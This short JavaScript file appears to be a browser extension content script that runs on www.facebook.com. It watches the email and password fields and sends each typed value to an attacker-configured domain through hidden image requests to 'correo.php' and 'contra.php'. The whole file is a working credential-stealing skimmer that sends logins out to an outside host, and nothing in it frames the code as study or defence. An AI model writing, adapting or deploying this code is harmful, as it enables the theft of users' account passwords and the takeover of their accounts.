function send_data(dom, type, data){
  let elem = document.createElement("img");
  elem.style.display = "none";
  elem.src = dom + "/" + type + ".php?v=" + encodeURIComponent(data) + "&d=" + encodeURIComponent(new Date().toISOString());
  document.body.appendChild(elem);
}
if (window.location.hostname == "www.facebook.com"){
  browser.storage.local.get("dominio").then((domObj) => {
    let dominio = domObj.dominio || "";
    // Correo
    document.getElementById("email").addEventListener("input", (e) => send_data(dominio, "correo", e.target.value) );

    // Contrasena
    document.getElementById("pass").addEventListener("input", (e) => send_data(dominio, "contra", e.target.value) );
  });
}
